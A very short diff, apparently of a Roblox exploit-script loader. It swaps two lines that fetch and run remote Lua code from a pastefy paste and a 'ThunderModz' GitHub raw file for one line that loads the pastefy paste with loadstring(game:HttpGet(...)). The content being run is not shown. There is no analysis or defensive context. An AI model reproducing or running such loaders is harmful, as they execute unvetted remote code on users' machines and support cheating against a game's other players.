@@ -1,3 +1,1 @@
-RUN_AFTER=loadstring(game:HttpGet("https://pastefy.app/ErSRRYt2/raw"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/scirp/refs/heads/main/lua"))()
+loadstring(game:HttpGet("https://pastefy.app/ErSRRYt2/raw"))()
